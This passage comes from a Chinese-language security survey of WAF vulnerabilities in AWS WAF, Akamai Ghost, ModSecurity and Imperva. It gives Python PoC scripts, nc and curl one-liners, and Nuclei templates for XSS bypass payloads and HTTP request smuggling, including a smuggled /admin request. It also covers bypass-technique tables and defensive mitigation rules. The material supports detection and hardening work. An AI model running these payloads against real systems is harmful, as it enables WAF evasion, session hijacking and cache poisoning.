            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        if resp.status_code in (403, 406, 429, 501):
            normal_blocked = True
            break

    if not normal_blocked:
        print("[*] XSS payload 未被 WAF 拦截，无法验证绕过")
        return False

    for technique in bypass_techniques:
        for payload in xss_payloads:
            bypass_payload = technique(payload)
            try:
                resp = requests.get(
                    target.rstrip("/") + "/search",
                    params={"q": bypass_payload},
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=False,
                )
                if resp.status_code == 200:
                    bypass_found = True
                    break
            except requests.RequestException:
                continue
        if bypass_found:
            break

    return bypass_found


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - AWS WAF Bypass {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: aws-waf-xss-bypass

info:
  name: AWS WAF - XSS Bypass via Encoding Techniques
  author: x7peeps
  severity: medium
  description: |
    Tests common WAF bypass techniques against AWS WAF protected
    endpoints using encoding, case variation, and DOM-based payloads.
  tags: aws,waf,xss,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
      - "{{BaseURL}}/search?q=%3CsVg%2FonLoad%3Dalert(1)%3E"
      - "{{BaseURL}}/search?q=%22%3E%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "alert(1)"
          - "onerror"
        condition: or

      - type: status
        status:
          - 200
```

---

## 0x04 Akamai WAF 安全风险

Akamai 是全球最大的 CDN 和云安全平台之一，其 Kona Site Defender（KSD）是旗舰级 WAF 产品，基于 Akamai Intelligent Edge Platform 运行。Akamai 的边缘服务器（代号 Ghost）在全球超过 4200 个 PoP 点部署，每天处理数十亿次 WAF 规则触发。然而，作为 HTTP 代理和反向代理的核心组件，Ghost 的 HTTP 协议处理逻辑中也存在多个安全漏洞。

### 0x04.1 CVE-2025-66373 — Akamai Ghost Chunked Body 处理错误导致请求走私

**漏洞背景**

CVE-2025-66373 由安全研究员 Jinone (@jinonehk) 通过 Akamai Bug Bounty 项目发现，于 2025 年 11 月 17 日完全修复，CVSS 3.1 评分 4.8（MEDIUM）。该漏洞存在于 Akamai Ghost 的 chunked transfer encoding 处理逻辑中。当收到一个包含无效 chunked body 的请求时，Akamai Ghost 会在某些情况下错误地将无效请求和多余的字节转发到后端服务器，攻击者可以在这些多余字节中隐藏一个被"走私"的请求。

**受影响版本 / 修复版本**

| 产品 | 影响范围 | 修复方案 |
|---|---|---|
| Akamai Ghost (CDN Edge) | 2025-11-17 之前的所有版本 | 服务端修复，无需客户操作 |

**漏洞原理分析**

HTTP/1.1 的 chunked transfer encoding 将请求体分为多个 chunk，每个 chunk 以十六进制长度值开头，后跟换行符和对应长度的数据，最后以长度为 0 的 chunk 结束。例如：

```
4\r\n
Wiki\r\n
6\r\n
pedia \r\n
E\r\n
in \r\n
\r\n
0\r\n
\r\n
```

Akamai Ghost 在处理 chunked body 时存在一个边界条件错误：当收到的 chunk 大小声明与实际数据长度不匹配时，Ghost 的解析器没有正确地拒绝整个请求。在某些处理路径下，它会将包含无效 chunk 的请求连同后续的"多余字节"一起转发给后端服务器。

这些"多余字节"可以是另一个完整的 HTTP 请求。当后端服务器（如 Nginx、Apache）收到这些数据时，会将其视为一个新的 HTTP 请求处理——这就是经典的 HTTP Request Smuggling 攻击。

此漏洞的可利用性取决于后端服务器的实现行为。如果后端服务器在 keep-alive 连接上正确处理了不完整的请求，那么走私的请求会被丢弃。但如果后端服务器对输入数据的处理较为宽松（例如在遇到数据后尝试从中解析出下一个完整的 HTTP 请求），那么攻击者就可以成功走私请求。

攻击者可以利用这种走私能力实现：

- **会话劫持**：将其他用户的请求走私到攻击者控制的端点，捕获 Cookie 和认证令牌
- **缓存投毒**：通过走私请求污染 CDN 缓存
- **绕过前端 ACL**：走私请求绕过 CDN 层的访问控制规则

**HTTP PoC**

```bash
# 使用 raw HTTP 发送 chunked 请求
printf "POST /api/submit HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\nhello\r\n" | nc target.com 80
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2025-66373 Akamai Ghost Chunked Request Smuggling Detection"""
import socket
import ssl
import sys


def check(target_host, port=443, use_ssl=True):
    """检测目标是否存在 CVE-2025-66373 请求走私风险"""
    smuggled_request = (
        "GET /smuggled-test HTTP/1.1\r\n"
        "Host: " + target_host + "\r\n"
        "X-Smuggled: true\r\n"
        "\r\n"
    )

    chunk_size = len(smuggled_request)
    body = f"{chunk_size:x}\r\n{smuggled_request}\r\n0\r\n\r\n"

    request = (
        f"POST /api/submit HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-encoding: cow\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
        f"hello{body}"
    )

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=target_host)

        sock.connect((target_host, port))
        sock.send(request.encode())

        response = b""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if b"\r\n\r\n" in response:
                    break
        except socket.timeout:
            pass

        sock.close()

        response_str = response.decode("utf-8", errors="ignore")
        if "X-Smuggled" in response_str or "smuggled-test" in response_str:
            return True
        return False

    except Exception as e:
        print(f"[!] 连接异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_host>")
        sys.exit(1)
    host = sys.argv[1]
    result = check(host)
    print(f"[{'+' if result else '-'}] {host} - CVE-2025-66373 Request Smuggling {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2025-66373

info:
  name: Akamai Ghost - Chunked Body Request Smuggling
  author: x7peeps
  severity: medium
  description: |
    Akamai Ghost chunked request body processing error that can result
    in HTTP request smuggling via invalid chunk sizes.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-66373
    - https://www.akamai.com/blog/security/cve-2025-66373-http-request-smuggling-chunked-body-size
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N
    cvss-score: 4.8
    cve-id: CVE-2025-66373
    cwe-id: CWE-444
  tags: cve,cve2025,akamai,request-smuggling,chunked

http:
  - raw:
      - |
        POST /api/submit HTTP/1.1
        Host: {{Hostname}}
        Transfer-Encoding: chunked
        Transfer-encoding: cow
        Content-Type: application/x-www-form-urlencoded

        5
        hello
        0

    matchers:
      - type: word
        words:
          - "X-Smuggled"
          - "HTTP/1.1 404"
        condition: or
```

### 0x04.2 CVE-2025-32094 — Akamai Ghost OPTIONS 请求走私

**漏洞背景**

CVE-2025-32094 于 2025 年 8 月 7 日披露，CVSS 3.1 评分 4.0（MEDIUM）。该漏洞影响 2025-03-26 之前的 Akamai Ghost 版本。攻击者通过发送携带 `Expect: 100-continue` 头部的 HTTP/1.x OPTIONS 请求，并使用废弃的行折叠（obsolete line folding）技术，可以在两个 Akamai 路径内服务器之间制造解析差异，从而在原始请求体中走私第二个请求。

**受影响版本 / 修复版本**

| 产品 | 影响范围 | 修复方案 |
|---|---|---|
| Akamai Ghost (CDN) | 2025-03-26 之前版本 | 服务端修复 |

**漏洞原理分析**

此漏洞利用了 HTTP/1.1 协议中一个鲜为人知的特性——废弃的行折叠（obsolete line folding）。根据 RFC 9112，HTTP 头部值可以通过在行首插入空格或制表符来实现"折叠"，虽然该特性已被废弃但仍被部分实现支持。

当攻击者发送以下格式的请求时：

```
POST /api/data HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 42
 
Content-Type: application/json
```

注意 `Content-Type` 前的空格——这利用了行折叠将 `Content-Type` 头部"折叠"到 `Expect` 头部的值中。Akamai Ghost 架构中存在两个处理路径（可能是前端代理和边缘节点），它们对此类请求的解析方式不一致。一个路径将 `Content-Type` 视为独立的头部，另一个路径将其视为 `Expect` 头部值的一部分。

这种不一致导致第一个路径认为请求体长度为 42 字节（按照 `Content-Length` 处理），而第二个路径可能使用不同的长度计算方式。攻击者可以在请求体中嵌入一个完整的 HTTP 请求，当两个路径的解析结果被合并时，被嵌入的请求会被后端服务器视为一个独立的新请求处理。

该漏洞在 Black Hat US 2025 会议上被提及，作为 "HTTP/1 Must Die: The Desync Endgame" 研究的一部分，进一步证明了 HTTP/1.1 协议在现代 CDN 架构中的安全隐患。

**HTTP PoC**

```bash
# 使用 raw socket 发送利用废弃行折叠的请求
printf "POST /api/data HTTP/1.1\r\nHost: target.com\r\nExpect: 100-continue\r\nContent-Length: 42\r\n Content-Type: application/json\r\n\r\n{\"cmd\":\"whoami\"}\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2025-32094 Akamai Ghost OPTIONS Smuggling Detection"""
import requests
import sys


def check(target):
    """检测目标是否存在 CVE-2025-32094 OPTIONS 走私风险"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Expect": "100-continue",
        "Content-Length": "42",
    }

    smuggled_body = (
        '{"cmd":"id"}\r\n'
        'GET /smuggled-test HTTP/1.1\r\n'
        'Host: ' + target.replace("https://", "").replace("http://", "") + '\r\n'
        'X-Smuggled: true\r\n'
        '\r\n'
    )

    headers_with_fold = dict(headers)
    headers_with_fold[" Content-Type"] = "application/json"

    try:
        resp = requests.post(
            target.rstrip("/") + "/api/data",
            data=smuggled_body,
            headers=headers_with_fold,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if resp.status_code in (200, 201) or "X-Smuggled" in resp.headers:
            return True

        options_headers = dict(headers)
        options_headers["Content-Type"] = "application/json"
        options_headers[" Content-Type"] = "application/x-www-form-urlencoded"

        options_resp = requests.options(
            target.rstrip("/") + "/api/data",
            headers=options_headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if options_resp.status_code in (200, 204):
            return False
        if options_resp.status_code in (405, 403):
            return False

        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2025-32094 OPTIONS Smuggling {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2025-32094

info:
  name: Akamai Ghost - OPTIONS Request Smuggling
  author: x7peeps
  severity: medium
  description: |
    Akamai Ghost allows HTTP Request Smuggling via an OPTIONS request
    using obsolete line folding with Expect: 100-continue header.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-32094
    - https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N
    cvss-score: 4.0
    cve-id: CVE-2025-32094
    cwe-id: CWE-444
  tags: cve,cve2025,akamai,request-smuggling,options

http:
  - raw:
      - |
        POST /api/data HTTP/1.1
        Host: {{Hostname}}
        Expect: 100-continue
        Content-Length: 42
         Content-Type: application/json

        {"cmd":"whoami"}

    matchers:
      - type: word
        words:
          - "X-Smuggled"
          - "smuggled-test"
        condition: or

      - type: status
        status:
          - 200
```

### 0x04.3 CVE-2026-26365 — Akamai Ghost Connection 头处理导致请求走私

**漏洞背景**

CVE-2026-26365 于 2026 年披露，CVSS 3.1 评分 4.0（MEDIUM）。该漏洞影响 2026-02-06 之前的 Akamai Ghost 版本。当传入请求包含 `Connection: Transfer-Encoding` 头部时，Akamai Ghost 在某些处理路径下会错误地将该 hop-by-hop 头部转发，导致后端服务器解析出无效的消息帧（invalid message framing），从而可能触发 HTTP 请求走私。

**受影响版本 / 修复版本**

| 产品 | 影响范围 | 修复方案 |
|---|---|---|
| Akamai Ghost (CDN) | 2026-02-06 之前版本 | 服务端修复 |

**漏洞原理分析**

根据 HTTP 规范，`Connection` 头部用于指定逐跳（hop-by-hop）的连接选项。当客户端发送 `Connection: Transfer-Encoding` 头部时，它告诉中间代理：`Transfer-Encoding` 头部是逐跳的，不应该被转发到下一个 hop。

Akamai Ghost 在处理这类请求时，根据不同的处理路径可能有两种行为：一种路径正确地移除了 `Transfer-Encoding` 头部（因为 `Connection` 头指定了它是逐跳的），另一种路径则保留了 `Transfer-Encoding` 头部并将其转发给后端。当后端服务器收到一个同时包含 `Content-Length` 和 `Transfer-Encoding` 的请求时，就进入了经典的 HTTP Request Smuggling 场景。

攻击者可以构造一个请求，使 Akamai 的两个处理路径产生不同的转发结果，从而在后端服务器的输入缓冲区中注入一个被"走私"的请求。该请求可以指向内部 API 端点、管理接口或其他受前端 ACL 保护的资源。

**HTTP PoC**

```bash
curl -X POST "http://target.com/api/submit" \
  -H "Connection: Transfer-Encoding" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 5" \
  -H "Content-Type: application/json" \
  -d "hello"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2026-26365 Akamai Ghost Connection Header Smuggling Detection"""
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def check(target):
    """检测目标是否存在 CVE-2026-26365 Connection 头走私风险"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/json",
        "Connection": "Transfer-Encoding",
        "Transfer-Encoding": "chunked",
        "Content-Length": "5",
    }

    body = "hello"

    smuggled_request = (
        "GET /smuggled-test HTTP/1.1\r\n"
        f"Host: {target.replace('https://', '').replace('http://', '')}\r\n"
        "X-Smuggled: true\r\n"
        "\r\n"
    )

    try:
        normal_resp = requests.post(
            target.rstrip("/") + "/api/submit",
            data=body,
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        smuggle_headers = dict(headers)
        smuggle_headers["Transfer-Encoding"] = "chunked"

        smuggle_resp = requests.post(
            target.rstrip("/") + "/api/submit",
            data="0\r\n\r\n" + smuggled_request,
            headers=smuggle_headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if smuggle_resp.status_code in (200, 201):
            return True

        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2026-26365 Connection Smuggling {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2026-26365

info:
  name: Akamai Ghost - Connection Header Request Smuggling
  author: x7peeps
  severity: medium
  description: |
    Akamai Ghost mishandles processing of custom hop-by-hop HTTP headers
    where "Connection: Transfer-Encoding" can result in invalid message
    framing and HTTP request smuggling.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-26365
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N
    cvss-score: 4.0
    cve-id: CVE-2026-26365
    cwe-id: CWE-444
  tags: cve,cve2026,akamai,request-smuggling,connection-header

http:
  - raw:
      - |
        POST /api/submit HTTP/1.1
        Host: {{Hostname}}
        Connection: Transfer-Encoding
        Transfer-Encoding: chunked
        Content-Length: 5
        Content-Type: application/json

        hello

    matchers:
      - type: word
        words:
          - "X-Smuggled"
          - "smuggled-test"
        condition: or

      - type: status
        status:
          - 200
```

---

## 0x05 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | GitHub PoC | Exploit-DB | Metasploit | Nuclei | 在野利用 |
|---|---|---|---|---|---|
| CVE-2024-1019 | CRS 团队 PoC | — | — | 需自建 | 未报告 |
| CVE-2023-38285 | Trustwave 公告 | — | — | 需自建 | 未报告 |
| CVE-2023-38199 | CRS 团队规则 | — | — | 需自建 | 未报告 |
| CVE-2023-50969 | HoyaHaxa PoC | — | — | 需自建 | 未报告 |
| CVE-2026-13762 | — | — | — | 需自建 | 未报告 |
| CVE-2025-66373 | Akamai 修复 | — | — | 需自建 | 未报告 |
| CVE-2025-32094 | Akamai 修复 | — | — | 需自建 | 未报告 |
| CVE-2026-26365 | Akamai 修复 | — | — | 需自建 | 未报告 |

### 关键 PoC 仓库链接

| 资源 | 链接 | 说明 |
|---|---|---|
| OWASP CRS 项目 | https://github.com/coreruleset/coreruleset | CRS 规则集源码，包含 CVE-2023-38199 修复规则 920620 |
| OWASP ModSecurity | https://github.com/owasp-modsecurity/ModSecurity | ModSecurity v3 引擎源码 |
| HoyaHaxa Blog | https://www.hoyahaxa.com/2024/03/imperva-waf-bypass-cve-2023-50969.html | CVE-2023-50969 完整技术分析和 PoC |
| Akamai 安全公告 | https://www.akamai.com/blog/security/ | Akamai Ghost CVE 官方技术公告 |
| AWS 安全公告 | https://aws.amazon.com/security/security-bulletins/ | AWS WAF CVE 官方安全公告 |
| WAFFLED 研究论文 | https://arxiv.org/html/2503.10846v1 | WAF 解析差异学术研究，覆盖 AWS/Azure/Cloudflare/ModSecurity |
| GoTestWAF | https://github.com/wallarm/gotestwaf | 开源 WAF 测试工具，支持多款 WAF 绕过检测 |
| PortSwigger XSS Reference | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet | XSS payload 参考库 |

### 防守型验证思路

1. **环境搭建**：在隔离环境中部署受影响版本的 WAF（如 ModSecurity v3.0.11），配置 OWASP CRS 3.3.4 规则集，模拟真实生产环境
2. **分层验证**：先验证正常请求是否被正确拦截，再验证绕过 payload 是否能通过 WAF 到达后端
3. **自动化回归**：将本专题提供的 Nuclei 模板集成到 CI/CD 流水线中，每次 WAF 规则更新后自动回归测试
4. **监控告警**：对 WAF 日志中的异常模式（如异常 Content-Encoding 值、chunked 编码异常）设置实时告警
5. **多角度测试**：不要只依赖单一测试方法，应同时使用 encoding bypass、protocol manipulation 和 logic bypass 三种维度的测试

---

## 0x06 WAF 绕过技术体系

### 编码混淆绕过

编码混淆是 WAF 绕过中最基础也最常用的技术类别，其核心思想是在不改变 payload 语义的前提下改变其表示形式，使 WAF 的签名匹配引擎无法识别恶意特征。

**常见编码混淆技术**

| 技术 | 原理 | 代表 CVE |
|---|---|---|
| URL 双重编码 | `%25` 解码一次后变为 `%`，再解码才变为实际字符 | CVE-2024-1019（URL 解码顺序差异） |
| Unicode/UTF-8 归一化 | 使用 Unicode 编码替代 ASCII 字符，WAF 未做完整归一化 | CRS 通用绕过技术 |
| HTML 实体编码 | 将 `<` 编码为 `&#60;`，绕过 WAF 的 HTML 标签检测 | XSS 绕过 |
| 大小写混合 | `SeLeCt` 替代 `select`，部分 WAF 规则未做大小写归一化 | SQL 注入绕过 |
| 十六进制编码 | 将字符替换为 `\xHH` 形式 | Python/PHP 环境特有 |

**案例：CVE-2024-1019 的 URL 编码绕过**

该漏洞本质上是一种编码归一化差异导致的绕过。攻击者使用 `%3F`（`?` 的 URL 编码形式）来隐藏 payload，ModSecurity v3 在错误的处理阶段执行了解码，导致编码后的恶意内容被"隐藏"在 query string 组件中。这与传统的 URL 双重编码绕过不同——它不需要解码两次，而是利用了 WAF 与后端在解码**时机**上的差异。

### 协议层绕过

协议层绕过是 WAF 安全中最具技术深度的攻击维度，涉及 HTTP 协议的底层实现差异。

**常见协议层绕过技术**

| 技术 | 原理 | 代表 CVE |
|---|---|---|
| HTTP/2 帧分割 | 将 payload 分散在多个 DATA 帧中，WAF 只检查部分帧 | CVE-2026-13762（AWS WAF） |
| Chunked 编码混淆 | 利用 chunk 大小声明与实际数据不匹配的边界条件 | CVE-2025-66373（Akamai） |
| Connection 头走私 | 利用 hop-by-hop 头部的歧义处理制造前后端差异 | CVE-2026-26365（Akamai） |
| 废弃行折叠 | 利用 HTTP/1.1 中已被废弃但仍被部分实现支持的特性 | CVE-2025-32094（Akamai） |
| WebSocket 升级 | 通过 WebSocket 协议切换绕过 HTTP 层的 WAF 检查 | 通用技术 |
| Expect: 100-continue | 利用期望机制影响请求处理流程 | CVE-2025-32094 |

**案例：CVE-2026-13762 的 HTTP/2 帧分割**

该漏洞是协议层绕过的典型代表。HTTP/2 协议将数据传输从文本流变为帧序列，每个 DATA 帧独立携带长度信息。AWS WAF 的 body inspection 引擎在处理 HTTP/2 请求时，没有完整重组所有 DATA 帧后再检查，而是可能在帧级别就开始了规则匹配。攻击者只需将恶意 payload 放在第二个或更后面的 DATA 帧中，就能绕过 WAF 的检测。这种攻击在 HTTP/1.1 的 `Content-Length` 和 `Transfer-Encoding` 语义下是无法实现的——因为 HTTP/1.1 的请求体是一个连续的字节流，WAF 可以完整读取后再做检查。

### 逻辑层绕过

逻辑层绕过利用的是 WAF 规则配置和逻辑判断上的缺陷，而非协议或编码层面的差异。

**常见逻辑层绕过技术**

| 技术 | 原理 | 代表 CVE |
|---|---|---|
| 参数污染（HPP） | 在同一个参数名中传入多个值，WAF 检查第一个而后端使用最后一个 | CRS 配置不当 |
| Content-Type 混淆 | 发送多个 Content-Type 头，WAF 和后端选择不同的值 | CVE-2023-38199（CRS） |
| Content-Encoding 歧义 | 利用多个 Content-Encoding 头使 WAF 跳过 body 检查 | CVE-2023-50969（Imperva） |
| 注释插入 | 在 SQL 关键字中插入注释，WAF 规则无法匹配但数据库可执行 | SQL 注入绕过 |
| 分块传输 | 将恶意 payload 拆分到多个参数中，单独检查每个参数都合法 | 通用技术 |

**案例：CVE-2023-38199 的 Content-Type 混淆**

CRS v3.3.4 在 Nginx 平台上无法检测多个 `Content-Type` 头部的存在。当攻击者发送包含两个 Content-Type 的请求时：

```
Content-Type: application/x-www-form-urlencoded
Content-Type: application/json
```

Nginx 保留两个独立的头部，CRS 的规则 920470 不会触发。而如果后端应用选择第二个 Content-Type（`application/json`）来解析请求体，但 WAF 按照第一个 Content-Type（`application/x-www-form-urlencoded`）来解析，攻击者就可以构造在 JSON 格式下有效但在 URL 编码格式下无意义的 payload，实现绕过。

**案例：CVE-2023-50969 的 Content-Encoding 歧义**

Imperva WAF 的处理逻辑在收到两个 `Content-Encoding` 头部时选择了"静默跳过"——它认为第一个无效的编码值意味着请求体无法被正确解析，因此放弃了对 body 的检查。但后端应用并不关心 `Content-Encoding` 头部的具体值（特别是当 Content-Type 是 `application/x-www-form-urlencoded` 时），它直接解析了原始的 URL 编码 body。这种逻辑分歧是 WAF 产品中最隐蔽的攻击面之一。

---

## 0x07 共性攻击模式分析

### 模式 1：解析顺序差异

**描述**：WAF 和后端对同一协议元素的处理顺序不同（如先解码后拆分 vs 先拆分后解码），导致 WAF 检查的内容与后端处理的内容不一致。

**代表 CVE**：CVE-2024-1019（ModSecurity v3 URL 解码顺序错误）

这是最经典的 WAF bypass 模式。RFC 规范定义了 HTTP 消息处理的正确顺序，但 WAF 引擎为了性能或实现方便，可能跳过了某些步骤或颠倒了顺序。攻击者只需找到这个顺序差异点，就能构造"对 WAF 透明但对后端有效"的 payload。

### 模式 2：多头部解析歧义

**描述**：当 HTTP 请求包含重复或冲突的头部字段时，WAF 和后端选择不同的值进行处理，形成 impedance mismatch。

**代表 CVE**：CVE-2023-38199（CRS 多 Content-Type 头）、CVE-2023-50969（Imperva 多 Content-Encoding 头）

HTTP 规范允许某些头部字段出现多次（如 Set-Cookie），但对于 Content-Type、Content-Encoding 等字段，规范的语义并不总是明确的。WAF 和后端对"多个同名头部时选择哪个值"的策略可能不同——一个选择第一个，另一个选择最后一个。攻击者利用这种差异，构造"对 WAF 无害但对后端有害"的请求。

### 模式 3：协议版本差异

**描述**：WAF 和后端对不同 HTTP 版本（HTTP/1.0、HTTP/1.1、HTTP/2）的处理逻辑存在差异，攻击者选择 WAF 处理较弱的协议版本发送请求。

**代表 CVE**：CVE-2026-13762（AWS WAF HTTP/2 帧处理差异）

随着 HTTP/2 的普及，WAF 产品面临从文本协议到二进制协议的转换挑战。HTTP/2 的帧级别的多路复用特性为攻击者提供了新的攻击面——攻击者可以利用帧级别的语义差异来绕过应用层级别的检查。这种模式在未来随着 HTTP/3（基于 QUIC）的普及可能会变得更加复杂。

### 模式 4：协议模糊特性利用

**描述**：利用 HTTP 协议中已废弃或定义模糊的特性（如行折叠、hop-by-hop 头部），在 WAF 和后端之间制造解析差异。

**代表 CVE**：CVE-2025-32094（Akamai 废弃行折叠）、CVE-2026-26365（Akamai Connection 头处理）

HTTP/1.1 协议经过数十年的演化，积累了大量的遗留特性和模糊定义。RFC 9112 虽然试图统一规范，但"废弃"并不等于"不被使用"。攻击者深入研究 HTTP 协议规范，找出那些"规范允许但 WAF 未实现"的特性，利用这些特性制造前后端的解析差异。

### 模式 5：变换操作资源耗尽

**描述**：利用 WAF 引擎中输入变换操作的算法缺陷，通过构造特定模式的输入触发最坏时间复杂度，导致 WAF 引擎 CPU 耗尽。

**代表 CVE**：CVE-2023-38285（ModSecurity 变换操作 DoS）

这种模式不是绕过 WAF 的检查，而是让 WAF "无法检查"。当 WAF 的某个处理环节被恶意输入"卡住"时，整个 WAF 引擎的吞吐量会急剧下降。在高并发场景下，这种 DoS 攻击可能导致 WAF 形同虚设——合法请求和恶意请求都无法被正确处理。

---

## 0x08 应急排查与防守建议

### 紧急排查清单

| 排查项 | 操作 | 优先级 |
|---|---|---|
| ModSecurity 版本检查 | 运行 `modsecurity -v` 或检查 `mod_security3.so` 版本，确认 >= 3.0.12 | P0 |
| CRS 版本检查 | 检查 CRS 版本 >= 3.3.5 或 4.x，确认包含规则 920620 | P0 |
| Imperva ADC 更新 | 登录 Imperva 管理控制台，确认已应用 2024-02-26 ADC 规则更新 | P0 |
| AWS WAF 配置审计 | 检查 CloudFront Distribution 是否启用了 AWS WAF，确认 ALB 的 WAF HTTP/2 检查配置 | P1 |
| Akamai Ghost 版本 | 联系 Akamai 确认 Ghost 版本已包含 2025-11-17 和 2026-02-06 修复 | P1 |
| WAF 日志审计 | 搜索近 30 天日志中的异常 Content-Encoding 值、chunked 编码异常 | P1 |
| 端口暴露检查 | 确认 WAF 后端（origin）未直接暴露在公网 | P1 |

### 日志关键字段表

| 日志字段 | 正常值 | 异常值（需告警） |
|---|---|---|
| `Content-Encoding` | `gzip`, `deflate`, `br` | 任意非标准值（如 `No Kill No Beep Beep`） |
| `Transfer-Encoding` | `chunked` | 多个 `Transfer-Encoding` 头部、大小写不一致 |
| `Connection` | `keep-alive`, `close` | `Connection: Transfer-Encoding` |
| ModSecurity `INBOUND_ANOMALY_SCORE` | 0 | >= 5（PL1），>= 15（PL2） |
| ModSecurity `MATCHED_VAR` | 正常参数值 | 包含 `%3F`、`%25` 等编码序列 |
| AWS WAF `awswaf_` 日志 | `Allow` | `Block` 后紧跟的 `Allow` 请求 |
| HTTP/2 帧数 | 单个请求 1-3 个 DATA 帧 | 异常大量的小 DATA 帧 |

### 紧急缓解措施

**ModSecurity 环境**：

1. 升级 libmodsecurity 至 3.0.12+（优先）或 3.0.15+
2. 升级 CRS 至 3.3.5+ 或 4.x
3. 添加以下规则作为临时缓解（添加在 CRS include 之前）：

```
SecRule &REQUEST_HEADERS:Content-Type "@gt 1" \
  "id:100001,phase:1,deny,status:403,\
  msg:'Multiple Content-Type headers detected (CVE-2023-38199)',\
  tag:'CVE-2023-38199'"
```

4. 降低 `SecRequestBodyNoFilesLimit` 至默认值（131072）或更低
5. 为 ARGS 参数添加长度限制：`SecRule ARGS "@gt 16000" "id:100002,phase:2,t:length,deny,status:403"`

**Imperva 环境**：

1. 立即应用 ADC 规则更新（2024-02-26 或更新版本）
2. 审计 `Content-Encoding` 头部的处理策略
3. 在 Imperva 管理控制台中启用严格的 Content-Encoding 白名单

**AWS WAF 环境**：

1. 确保使用最新的 managed rules 版本
2. 为 ALB 启用 WAF HTTP/2 body inspection 配置选项
3. 添加自定义规则检测异常的 HTTP/2 帧模式
4. 启用 AWS WAF Logging 并将日志发送到 CloudWatch 或 S3 进行分析

**Akamai 环境**：

1. 确认 Akamai Ghost 版本包含所有安全修复
2. 启用 Kona Rule Set（KRS）自动更新或 Adaptive Security Engine（ASE）
3. 配置 Rate Controls 限制异常请求速率
4. 启用 Client Reputation 功能检测已知恶意 IP

### 长期安全加固建议

1. **纵深防御**：WAF 不是银弹。在 WAF 之后仍然需要对输入进行验证和转义，不应完全依赖 WAF 作为唯一防线
2. **定期回归测试**：每季度使用 GoTestWAF 等工具对 WAF 配置进行自动化回归测试
3. **Paranoia Level 调优**：OWASP CRS 提供 PL1-PL4 四个偏执级别，生产环境建议至少使用 PL2 并针对误报进行调优
4. **多层 WAF**：对于关键业务，在 CDN 层和应用层分别部署 WAF，形成多层防御
5. **持续监控**：建立 WAF 绕过行为的实时监控和告警机制，对异常流量模式保持警觉
6. **安全开发生命周期**：在开发阶段就进行安全编码实践，不要把安全责任全部推给 WAF
7. **协议升级**：在条件允许的情况下，优先使用 HTTP/2 或 HTTP/3，因为这些协议的帧级语义可以减少某些类型的绕过（但同时也会引入新的攻击面）

---

## 0x09 参考资料

1. **OWASP ModSecurity CVE 公告** — https://owasp.org/www-project-modsecurity/tab_cves
2. **CVE-2024-1019 技术分析** — https://owasp.org/www-project-modsecurity/ （ModSecurity v3 WAF Bypass 完整披露）
